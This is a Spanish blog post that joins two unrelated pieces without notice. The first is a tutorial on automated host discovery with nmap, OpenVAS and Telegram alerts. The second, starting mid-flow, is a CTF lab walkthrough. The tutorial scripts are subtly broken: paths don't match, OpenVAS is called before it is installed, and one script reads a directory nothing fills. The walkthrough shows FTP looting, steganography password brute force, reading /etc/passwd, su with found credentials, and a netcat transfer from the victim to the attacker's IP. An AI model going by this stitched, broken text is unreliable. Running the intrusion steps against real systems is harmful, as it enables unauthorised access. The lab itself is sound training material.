---
title: Descubrimiento de nuevos hosts conectados a una red automáticamente.
date: 2025-01-09 9:00:00
categories: [Tools, Network]
tags: [tools, network, discovery, automate, hosts]    
author: "Waidroc"
---


![Portada](/assets/img/2025-01-09/portada.png)


<h2> Introducción </h2>

**¡Hola de nuevo a todxs!**  👋🏻 

Tras un tiempo sin escribir ningún artículo nuevo, volvemos a la carga con uno de perfil técnico bastante interesante, el cuál podéis ir aplicando, siguiendo paso a paso su explicación y demostración.

> Si lo preferís, podéis clonaos directamente el repositorio de Github, conteniendo todos los scripts desarrollados durante la publicación, así como la estructura de directorios del proyecto [`periodicNetworkScanner`](https://github.com/Waidroc/periodicNetworkScanner/)
{: .prompt-tip}


Como todos sabemos, supervisar nuestras redes, es una tarea esencial para mantener la seguridad de nuestros activos, debiendo de tener en el mapa en todo momento, que nuevos hosts se han conectado a nuestras redes, para así poder prevenir una posible intrusión o movimiento malintencionado y que ningún cibercriminal actúe de manera ilegítima en nuestra red, tanto en vía cableada como inalámbrica.

Para ello, implementaremos y configuraremos una serie de herramientas, acompañadas de diversos scripts en bash, que nos facilitarán la tarea, en nuestro entorno Kali Linux, dando lugar a la automatización del descubrimiento de hosts, realizando escaneos periódicos y recibiendo notificaciones vía Telegram, cuando un nuevo dispositivo se conecta a cualquiera de las redes que tengamos identificadas.

Los objetivos que queremos conseguir con este proyecto, son los siguientes:

⧫ **Desarrollar una solución totalmente autónoma para el descubrimiento de hosts en redes previamente identificadas.**

⧫ **Integrar Nmap como motor principal de exploración.**

⧫ **Garantizar que el sistema notifique los nuevos hosts detectados para una supervisión ágil y eficiente.**

> Todos los scripts que vamos a crear estarán en el PATH /home/username/Tools/periodicNetworkDiscovery
{: .prompt-tip}

```bash
mkdir -p /home/waidroc/Tools/periodicNetworkDiscovery/{scripts,configs,output/known_hosts,output/logs}
touch /home/waidroc/Tools/periodicNetworkDiscovery/output/dispositivos_conocidos.txt
```

El resultado sería el siguiente:

```bash
/home/waidroc/Tools/periodicNetworkDiscovery/
├── scripts/                      # Scripts principales
│   ├── escaneo_inicial.sh        # Realiza el escaneo inicial
│   └── detectar_nuevos_hosts.sh  # Escaneos periódicos y notificaciones
├── configs/                      # Configuraciones
│   └── redes_a_monitorizar.txt   # Redes a escanear
├── output/                       # Salidas organizadas
│   ├── known_hosts/              # Hosts conocidos por red
│   ├── logs/                     # Archivos de log
│   └── dispositivos_conocidos.txt # Lista consolidada de dispositivos conocidos
```

<h3>Configuración de redes a monitorizar</h3>

El siguiente paso, será la creación del fichero redes_a_monitorizar.txt, en el cual identificaremos las redes que disponemos en nuestra infraestructura, para así listar las redes que deseamos monitorizar:

```bash
nano /home/<username>/Tools/Periodic_Network_Discovery/configs/redes_a_monitorizar.txt
```

Añadiremos las redes al fichero creado (una por línea):

```bash
192.168.1.0/24
10.0.0.0/16
172.16.0.0/12
[...]
```

> Tengamos en cuenta que si queremos añadir una nueva red en el futuro, debemos de incluirla en este fichero.
{: .prompt-tip}


<h3>Script para el escaneo inicial</h3>

El siguiente script realizará el primer escaneo de las redes identificadas, guardando los resultados en un fichero, sin necesidad de notificación por parte del Bot recientemente creado.

Creación del script escaneo_inicial.sh:

```bash
nano /home/waidroc/Tools/periodicNetworkDiscovery/scripts/escaneo_inicial.sh
```

```bash
#!/bin/bash

# Directorios y configuración
CONFIG_FILE="../configs/redes_a_monitorizar.txt"
KNOWN_HOSTS_DIR="../output/known_hosts"
LOG_DIR="../output/logs"
OPENVAS_USER="username"
OPENVAS_PASS="password"

# Crear directorios si no existen
mkdir -p $KNOWN_HOSTS_DIR $LOG_DIR

# Escaneo inicial
while read -r RED; do
    echo "Iniciando escaneo inicial para la red: $RED"
    OUTPUT_FILE="$KNOWN_HOSTS_DIR/$(echo $RED | tr '/' '_').txt"
    omp -u $OPENVAS_USER -w $OPENVAS_PASS --target "$RED" --task "descubrimiento-ligero" > "$OUTPUT_FILE"
    echo "Resultados iniciales guardados en $OUTPUT_FILE"
done < "$CONFIG_FILE"

echo "Escaneo inicial completado. Verifica los resultados en $KNOWN_HOSTS_DIR"
```

Otorgamos al script permisos de ejecución:

```bash
chmod +x /home/waidroc/Tools/periodicNetworkDiscovery/scripts/escaneo_inicial.sh
```

<h3>Configuración del bot de Telegram para las notificaciones</h3>

En primera instancia, buscamos en Telegram a @BotFather para comenzar con la creación del bot.

Usamos el comando /newbot y seguimos las instrucciones para ponerlo en marcha:

Nombre de bot: NewHostsDiscovered
Username: hostDiscoveryBot

A continuación, el bot nos dará el TOKEN de la API para poder usarlo.

Con curl, obtendremos el chat_id:

```bash
curl -s https://api.telegram.org/bot<TU_TOKEN>/getUpdates | jq
```

Debemos de guardar tanto el chat_id como el API TOKEN, ya que lo utilizaremos más adelante en los scripts que desarrollemos.

<h3></h3>



<h3>Instalación y configuración de OpenVAS</h3>

Como siempre, lo primero que debemos de hacer es actualizar nuestro sistema, para así evitar futuros problemas con dependencias:

```bash
sudo apt update && sudo apt upgrade -y
```

Nos aseguramos de que tenemos instaladas las herramientas necesarias:

```bash
sudo apt install nmap mailutils gvm -y
```

Configuramos OpenVAS, descargando la BBDD de vulnerabilidades y configurando los servicios necesarios:

```bash
sudo gvm-setup
```

Para checkear que está todo correctamente implementado, lanzamos el siguiente comando:

```bash
sudo gvm-check-setup
```

El siguiente paso es acceder a la interfaz web de OpenVAS, accediendo por el default user llamado admin y con una contraseña generada automáticamente, que podemos visualizar en el siguiente fichero:

```bash
sudo cat /var/lib/gvm/users/admin/password
```

Una vez hayamos accedido, tenemos que automatizar los escaneos de nuevos hosts, realizando un análisis de descubrimiento automático para nuevos dispositivos en la red. Configuraremos OpenVAS a través de línea de comandos y utilizaremos su API para integrar el proceso.

Crearemos el script openvasScan.

```bash
#!/bin/bash

# Configuración
NEW_HOSTS_DIR="/tmp/nuevos_hosts"
LOG_DIR="/home/waidroc/Tools/periodicNetworkDiscovery/output/logs"

# Función para escanear un host con OpenVAS
escanear_host() {
    host=$1
    echo "Iniciando escaneo de vulnerabilidades para $host"

    # Crear un escaneo utilizando la línea de comandos de OpenVAS
    sudo gvm-cli --gmp-username admin --gmp-password "TU_CONTRASEÑA" socket --xml "<create_target><name>$host</name><hosts>$host</hosts></create_target>" > /tmp/target.xml
    target_id=$(grep -oP '(?<=id=").*?(?=")' /tmp/target.xml)

    sudo gvm-cli --gmp-username admin --gmp-password "TU_CONTRASEÑA" socket --xml "<create_task><name>Scan_$host</name><comment>Scan for $host</comment><config id='daba56c8-73ec-11df-a475-002264764cea'/><target id='$target_id'/></create_task>" > /tmp/task.xml
    task_id=$(grep -oP '(?<=id=").*?(?=")' /tmp/task.xml)

    sudo gvm-cli --gmp-username admin --gmp-password "TU_CONTRASEÑA" socket --xml "<start_task task_id='$task_id'/>"

    echo "Escaneo para $host iniciado. Revisa los resultados en la interfaz web de OpenVAS." >> "$LOG_DIR/openvas_scan.log"
}

# Escanear todos los nuevos hosts detectados
for file in $NEW_HOSTS_DIR/*; do
    if [ -s "$file" ]; then
        while IFS= read -r host; do
            escanear_host "$host"
        done < "$file"
    fi
done
```



<h3>Script para escaneos periódicos con notificaciones</h3>

El siguiente script está basado en el escaneo de redes con Nmap, comparando los resultados con el archivo histórico. A su vez, notificará por Telegram lo snuevos hosts detectados, agragando los nuevos activos a la lista de dispositivos conocidos si aparecen al menos 3 veces en los respectivos escaneos que vaya realizando.

Creamos el fichero detectar_nuevos_hosts.sh:

```bash
nano /home/waidroc/Tools/periodicNetworkDiscovery/scripts/detectar_nuevos_hosts.sh
```

El contenido debe de ser el siguiente:

```bash
#!/bin/bash

# Directorios y configuración
CONFIG_FILE="../configs/redes_a_monitorizar.txt"
KNOWN_HOSTS_DIR="../output/known_hosts"
KNOWN_DEVICES_FILE="../output/dispositivos_conocidos.txt"
LOG_DIR="../output/logs"
BOT_TOKEN="TU_BOT_TOKEN"
CHAT_ID="TU_CHAT_ID"

# Crear directorios y archivo de dispositivos conocidos si no existen
mkdir -p $KNOWN_HOSTS_DIR $LOG_DIR
touch $KNOWN_DEVICES_FILE

# Función para enviar notificaciones a Telegram
send_notification() {
    NUEVOS_HOSTS=$1
    MESSAGE="🚨 *Nuevos hosts detectados:*\n\n$NUEVOS_HOSTS"
    if [[ -z "$NUEVOS_HOSTS" ]]; then
        echo "No hay nuevos hosts para notificar."
    else
        curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
            -d chat_id="$CHAT_ID" \
            -d text="$MESSAGE" \
            -d parse_mode="Markdown"
        echo "Notificación enviada a Telegram."
    fi
}

# Escaneo periódico
while read -r RED; do
    echo "Iniciando escaneo para la red: $RED"
    OUTPUT_FILE="$KNOWN_HOSTS_DIR/$(echo $RED | tr '/' '_').txt"
    TEMP_FILE="$OUTPUT_FILE.tmp"

    # Realizar escaneo rápido con Nmap
    nmap -sn "$RED" -oG - | awk '/Up$/{print $2}' > "$TEMP_FILE"

    # Comparar resultados con el histórico
    if [[ -f "$OUTPUT_FILE" ]]; then
        NUEVOS_HOSTS=$(comm -13 <(sort "$OUTPUT_FILE") <(sort "$TEMP_FILE"))
        if [[ -n "$NUEVOS_HOSTS" ]]; then
            # Notificar nuevos hosts
            send_notification "$NUEVOS_HOSTS"

            # Añadir los nuevos hosts al historial
            echo "$NUEVOS_HOSTS" >> "$OUTPUT_FILE"

            # Contar ocurrencias de cada host y añadir a dispositivos conocidos si aparecen 3+ veces
            for HOST in $NUEVOS_HOSTS; do
                COUNT=$(grep -c "$HOST" "$OUTPUT_FILE")
                if [[ $COUNT -ge 3 ]]; then
                    if ! grep -q "$HOST" "$KNOWN_DEVICES_FILE"; then
                        echo "$HOST" >> "$KNOWN_DEVICES_FILE"
                        echo "Dispositivo conocido añadido: $HOST"
                    fi
                fi
            done
        fi
    fi

    # Actualizar archivo histórico
    mv "$TEMP_FILE" "$OUTPUT_FILE"
done < "$CONFIG_FILE"

echo "Escaneo completado. Revisa los logs y resultados."
```

Asignamos permisos de ejecución al script:

```bash
chmod +x /home/waidroc/Tools/periodicNetworkDiscovery/scripts/detectar_nuevos_hosts.sh
```

<h3> Automatizar el descubrimiento y monitorización en múltiples redes</h3>

Una vez guardado el script, automatizaremos la tarea con Cron, configurandolo para ejecutar este script periódicamente, por ejemplo cada 60 minutos:

```bash
crontab -e
```

Agregaremos la línea:

```bash
0 * * * * /bin/bash /home/waidroc/Tools/periodicNetworkDiscovery/scripts/detectar_nuevos_hosts.sh >> /home/waidroc/Tools/periodicNetworkDiscovery/output/logs/cron.log 2>&1
```






























Además de pertenecer al taller anteriormente mencionado, el CTF fue publicado como reto, con un premio bastante jugoso: `1 x curso OSINT en Linux en Cyber Hunter Academy y 1 x cena para 2 personas en el restaurante Figón del Huecar, Cuenca`. El ganador fue `@90n20sec`.

![Twitter](/assets/img/2023-02-17/tweet.jpg)

La máquina fue elaborada por mi y mi compañero `David Valero` (@cillo31) y nos centramos en realizar un servidor muy vulnerable con una fácil resolución, basándose principalmente en el reconocimiento, esteganografía y tocando muy por encima el OSINT.

Consta de una máquina de nivel básico, estupenda para comenzar en el mundillo de los CTF, la cual desde mi punto de vista veo genial para pasar un buen rato, además de aprender una serie de técnicas y conceptos que serán muy valiosos para el futuro.

Todos los recursos son totalmente públicos y descargables, incluyendo en el mismo repositorio los enlaces de descarga de la máquina virtual (.ova) y a su vez la presentación en `PowerPoint` con su resolución explicada de una forma más amena, para poder ser presentada en público en cualquier momento (recurso perfecto para docentes).

> Descarga del repositorio [`NightCityCTF`](https://github.com/Waidroc/NightCityCTF)
{: .prompt-tip}

Dicho esto, vamos a las consideraciones previas que tenemos que realizar para proceder a la resolución del CTF.

<h2> Consideraciones previas </h2> 

Para poder realizar este CTF, debemos de descargar la imagen de la MV e `importarla` en VirtualBox.

Una vez importada, debemos de meterla en la misma `Red NAT` que nuestra máquina atacante, en nuestro caso, utilizaremos Kali Linux, para que ambas se puedan comunicar entre sí.

![RedNat](/assets/img/2023-02-17/1.JPG)
![RedNat](/assets/img/2023-02-17/2.JPG)

<h2> Resolución </h2>

Lo primero de todo, es ver que rango de IPs tiene asignado la interfaz de la red NAT para posteriormente hacer un escaneo a dicha red y descubrir que `IP` tiene asignada nuestra máquina víctima.

```bash
ifconfig
sudo nmap --min-rate 5000 -sS 10.0.2.0/24
```

![descubrirIP](/assets/img/2023-02-17/reconocimiento.png)

Cuando tengamos localizada la IP víctima, debemos de comprobar bajo que `Sistema Operativo` está funcionando el servidor vulnerable. Podemos identificarlo gracias a su `TTL` (Time To Live/Tiempo De Vida), siendo este `64`. Puede saberse porque ese valor de TTL es asignado a los sistemas que trabajan con Linux, siendo a su vez el TTL con valor 128 perteneciente a las máquinas Windows. Debemos de tener en cuenta que no siempre nos reportan esos valores exactos, pueden ser inferiores debido a los saltos intermediarios que hacen los paquetes hasta llegar a su destino pero, en este caso, es exacto debido a que no hay intermediarios entre la máquina víctima y nuestra máquina atacante.

![linux](/assets/img/2023-02-17/linux.png)

El siguiente paso, no es obligatorio pero si es muy aconsejable. Consta de crear un `árbol de directorios de trabajo` para tener todo bien organizado. En mi caso, siempre tengo un directorio para los ficheros de volcado del reconocimiento, otro directorio para scripts y programas que se usarán y otro con todo los ficheros que considero importantes y que pueden usarse en un futuro, además de crear en el mismo ficheros con información que se va recabando (notas, credenciales...).

![directorioTrabajo](/assets/img/2023-02-17/directorioTrabajo.png)

Una vez tenemos bien localizada la máquina víctima y habiando localizado y escaneado anteriormente que servicios y puertos están abiertos en el servidor, vamos a lanzar `nmap` para ver que versiones tiene el software que nos está brindando (sV), acompañado de una serie de scripts básicos que nos ayudarán a encontrar vulnerabilidades (sC)

```bash
sudo nmap -p21,22,80 -sCV 10.0.2.4 -oN nightCityVulns
```

![nmapVuln](/assets/img/2023-02-17/nmapVuln.png)

Creamos el directorio `contenido` el cual, como indicamos anteriormente, nos servirá para alojar todos los documentos recabados que consideremos interesantes sobre nuestra víctima.

![directorioContenido](/assets/img/2023-02-17/carpetacontenido.png)

Ahora, vamos a comenzar a observar, descubrir y testear cada uno de los servicios que tenemos disponibles, sobre todo, el servicio FTP y HTTP.
Comenzamos con el servicio `FTP`, el cual, vamos a comprobar que tenga el logueo del usuario `anonymous` activo, el cual viene por defecto activado y sin contraseña.
Una vez dentro, podemos observar que contiene un directorio llamado reminder y a su vez, dentro de éñ, un fichero llamado reminder.txt, vamos a descargarlo y analizarlo en nuestra máquina.

```bash
ftp anonymous@10.0.2.4
dir
cd reminder
dir
get reminder.txt
exit
```

![reminder](/assets/img/2023-02-17/descargarremindertxt.png)

Vamos a visualizar que nos muestra el fichero de texto que acabamos de descargar.

```bash
cat reminder.txt
```

![reminder2](/assets/img/2023-02-17/reminder.png)

Parece que ya hemos sacado toda la información que nos brindaba el servidor FTP asique, vamos a proseguir con el análisis del servicio `HTTP`.

Lo primero de todo es añadir, por comodidad ya que, en este caso no se está aplicando un Virtual Hosting, la IP del servidor con su DNS, el cual le asignaremos nightcity.ctf, al fichero `/etc/hosts`.

```bash
nano /etc/hosts
10.0.2.4  nightcity.ctf
```

![hosts](/assets/img/2023-02-17/etchosts.png)

Ingresamos en la web vía navegador y hacemos un análisis general para ver si hay algo oculto (abrimos el inspector de elementos en busca de comentarios, código hardcodeado...) pero no se ve nada aparentemente.

![blog](/assets/img/2023-02-17/blog.png)

![commentsweb](/assets/img/2023-02-17/commentsweb.png)

Como no hemos visto nada, vamos a hacer un descubrimiento de directorios no indexados con la herramienta `wfuzz`, la cual viene preinstalada en nuestra máquina Kali Linux.

```bash
sudo wfuzz -c -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

> Hay que tener en cuenta que el diccionario que he usado es el de [`SecLists`](https://github.com/danielmiessler/SecLists) pero tambien viene preinstalado con el diccionario de dirbuster en Kali Linux (/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. De todos modos, es muy aconsejable tener en nuestra máquina ese repositorio de diccionarios, ya que nos trae diversos ficheros muy interesantes que nos podrán servir para distintas utilidades (ataques de fuerza bruta, fuzzing...)
{: .prompt-info}

![wfuzz](/assets/img/2023-02-17/wfuzz.png)

Una alternativa a la herramienta nombrada y usada anteriormente es el propio `nmap`, el cual cuenta con un script que viene en la librería de scripts que trae preinstalada el propio software, llamado `http-enum`.

```bash
sudo nmap -p80 --script=http-enum 10.0.2.4
```

![nmapdirectorios](/assets/img/2023-02-17/nmapdirectorios.png)

Ahora, vamos a indagar en los ficheros y directorios ocultos encontrados en el paso anterior.

En el fichero `robots.txt` nos muestra aparentemente una pista para proseguir con la resolución de la máquina.

![robots](/assets/img/2023-02-17/robotstxt.png)

Como siempre, vamos a descargarnos todos los ficheros que veamos interesantes, porque no sabremos si van a seguir disponibles en un futuro o no, además de poder analizar sus metadatos y posibles elementos ocultos.

```bash
wget http://nightcity.ctf/robots.txt
```

![drobots](/assets/img/2023-02-17/descargarobotstxt.png)

El fichero `robin` parece no tener mucho sentido, vamos a proseguir con el análisis de los demás ficheros y directorios y a tenerlo en cuenta para si en un futuro podremos hacer uso de él.

```bash
wget http://nightcity.ctf/robin
```

![robinw](/assets/img/2023-02-17/robinweb.png)

![robin](/assets/img/2023-02-17/robin.png)

Ahora, una vez analizado el directorio `secret` y habiendo comprobado que se tratan de imágenes (.jpg), vamos a crear el directorio imagenes, dentro de contenido, para tener todo bien clasificado. Las descargamos en nuestro equipo para un posterior análisis de las mismas.

```bash
mkdir imagenes
cd imagenes
wget http://nightcity.ctf/secret/most-wanted.jpg
wget http://nightcity.ctf/secret/some-light.jpg
wget http://nightcity.ctf/secret/veryImportant.jpg
```

![dimagenes](/assets/img/2023-02-17/descargaimagenes.png)

Vamos a proseguir con el análisis de los metadatos de las imágenes y, en una de ellas, vemos algo destacable (campos adicionales con un información relevante).
De entre todos ellos, podemos destacar unas coordenadas, las cuales vamos a analizar detenidamente e intentar geolocalizarlas. Para este paso, hemos utilizado `exiftool`, también viene preinstalada en Kali Linux.

```bash
exiftool some-light.jpg
```

![exiftool](/assets/img/2023-02-17/exiftool.png)

Abrimos `google maps` e introducimos en el buscador la coordenadas (hay que convertirlas para que realice dicha búsqueda). Podemos visualizar el logo de `Batman`, como siempre, creamos un fichero y apuntamos todo lo relevante para la resolución.

![map](/assets/img/2023-02-17/osint.png)

El siguiente paso es crear un diccionario con el fichero oculto robin que encontramos anteriormente, el cual como no tenía mucho sentido, podría servirnos como fuente de diccionario para un posterior ataque por fuerza bruta. Para ello usaremos la herramienta `cewl`, la cual viene también preinstalada en Kali Linux.

```bash
cewl http://nightcity.ctf/robin > robin.txt
wc -l robin.txt
```
Usamos `wc -l` para comprobar cuantas palabras contiene el diccionario. 

![cewlrobin](/assets/img/2023-02-17/diccionariorobin.png)

Ahora, vamos a usar `stegcracker` para intentar sacar por fuerza bruta los ficheros ocultos e incrustados a otros ficheros, en este caso, las imágenes. Esta herramienta se encarga de realizar un ataque por un diccionario seleccionado, encontrar cual es la contraseña correcta (si está en el diccionario) y extraer todo el contenido oculto en el contenedor (imagen).

```bash
stegcracker most-wanted.jpg robin.txt
```

![japon](/assets/img/2023-02-17/japon.png)

El fichero el cual contenía información oculta era `most-wanted.jpg`, el cual nos vuelca una cadena, aparentemente en `base64`. Vamos a decodificar la cadena y apuntar el resultado en un fichero con credenciales ya que parece ser la credencial de un posible usuario batman.

![passBatman](/assets/img/2023-02-17/contraseñabatman.png)

![dCredenciales](/assets/img/2023-02-17/directoriocredencialespng.PNG)

![fCredenciales](/assets/img/2023-02-17/archivocredenciales.png)

Vamos a acceder al servidor por el servicio SSH y... ¡¿Estamos dentro!!

![acceso](/assets/img/2023-02-17/acceso.png)

Vamos a hacer un `reconocimiento manual`, ya que se trata de una máquina virtual muy básica y no hacen falta herramientas que busquen debilidad/fallos de permisos, ficheros críticos..., como podría ser la herramienta `linpeas` (https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

Encontramos una imagen, vamos a pasarla a nuestra máquina atacante con netcat para su posterior análisis. Debemos de lanzar primero la orden en Kali para quedarnos en escucha para, posteriormente, lanzar `netcat` en la máquina víctima para transferirnos la imagen.

`Terminal máquina atacante`

```bash
nc -lvnp 4444 > iknowyou.jpg
```

`Terminal máquina víctima`

```bash
nc -N 10.0.2.5 4444 < iknowyou.jpg
```

![ncImagen](/assets/img/2023-02-17/pasarimagendeservidor.png)

Como no se ve nada significante en los metadatos y no contiene nada oculto dentro de ésta, vamos a intentar ver si tiene información visualmente escondida, analizándola a nivel de capas de bits. Para ello, vamos a utilizar la herramienta [`stegsolve`](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install).

Si no añadimos la ubicación de la herramienta al `path`, lo lanzamos desde el directorio donde se encuentra.

```bash
./stegsolve.jar
```

![gitclone](/assets/img/2023-02-17/gitclonestegsolve.png)

Seleccionamos la imagen y la analizamos. Encontramos en la parte izquierda un texto oculto `ThatMadeMeL4ugh!`

![stegsolve](/assets/img/2023-02-17/stegsolve.png)

![stegsolve2](/assets/img/2023-02-17/stegsolve2.png)

> Haciendo un pequeño inciso, os recomiendo esta herramienta online llamada [`Aperisolve`](https://www.aperisolve.com/), tratándose de un todo en uno para análisis de esteganografía. También nos aplica la técnica que acabamos de realizar con stegsolve, además de metadatos y otra información bastante útil. Os recomiendo que os paséis por ella e intentéis testearla!
{: .prompt-tip}


![aperisolve](/assets/img/2023-02-17/aperisolve.png)

![aperisolve2](/assets/img/2023-02-17/aperisolve2.png)

Ahora, teniendo esa credencial, necesitamos saber a qué usuario del sistema pertenece. Vamos a analizar el fichero `/etc/passwd`, ya que tenemos permiso de lectura sobre el mismo.

```bash
cat /etc/passwd
```

![passwd](/assets/img/2023-02-17/passwd.png)

Vemos que hay un usuario del sistema (ID +1000) llamado `joker`, vamos a intentar acceder a su home, pero no tenemos permisos.

![homejoker](/assets/img/2023-02-17/homejoker.PNG)

Teniendo el nombre de usuario `joker` y la credencial `ThatMadeMeL4ugh!`, vamos a intentar loguearnos.

```bash
su joker
ThatMadeMeL4ugh!
```

Ahora, ya podemos visualizar la flag en el directorio home del usuario joker. `¡¡¡Hemos encontrado al criminal!!!`

![flag](/assets/img/2023-02-17/flag.png)


¡Gracias por dedicar un tiempo a la resolución de esta máquina!
Espero que hayáis disfrutado y aprendido un montón y que este taller haya sido el empujón/motivación que necesitabáis para introduciros en el mundo de los CTFs y/o resoluciones de laboratorios y retos.


Remarcar que en las diapositivas del [`PowerPoint`](https://docs.google.com/presentation/d/1l-HuyGiftX1RhVKUf2-HRjsnHAvhX5QKidi8ZxG8Dd0/edit?usp=sharing) descargable está todo mejor explicado, a un nivel un poco más básico, no obviando alguna información que si lo ha sido en este post. Si te ha costado seguir un poco esta resolución, ¡échale un vistazo a la presentación!

Como siempre, cualquier duda y petición al respecto, podéis contactar conmigo a través del e-mail waidroc@protonmail.com

`Muchas gracías por leer, Waidroc :)`



